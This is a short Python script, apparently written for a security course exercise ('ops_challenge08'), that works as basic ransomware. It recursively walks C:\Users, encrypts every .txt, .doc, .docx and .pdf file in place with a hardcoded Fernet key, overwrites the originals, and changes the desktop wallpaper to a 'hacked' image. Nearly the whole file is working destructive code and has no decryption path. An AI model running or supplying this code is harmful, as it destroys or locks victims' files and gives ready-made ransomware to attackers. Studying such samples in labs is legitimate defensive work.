from cryptography.fernet import Fernet
import os
import ctypes
### VARIABLES ###
start_path = r"C:\Users"
key = "_TjtaRpjApz2rBn4m22iqH6x3wo_3iDE99HQwKwKt4o="
# initialize the Fernet class
f = Fernet(key)
### FUNCTIONS ###

#Change background
def backg():
    image = r"C:\Users\Violinist\Desktop\ops_challenge08\hacked.png"
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image , 0)

#Traverse directory tree and encrypt all files
def file_walk_en():
    for (root, dirs, files) in os.walk(start_path, topdown = False):
        for name in files:
            path = os.path.join(root, name)
            if (path[-4:] == ".txt"):
                encrypt_file(path, key)
            elif (path[-4:] == ".doc"):
                encrypt_file(path, key)
            if (path[-4:] == ".pdf"):
                encrypt_file(path, key)
            elif (path[-5:] == ".docx"):
                encrypt_file(path, key)
    backg()
def encrypt_file(filename, key):
    """
    Given a filename (str) and key (bytes), it encrypts the file and writes it
    """
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypting_data = f.encrypt(file_data)
    #Write over the existing file
    with open(filename, "wb") as file:
        file.write(encrypting_data)

### MAIN ###
file_walk_en()
backg()
### END ###
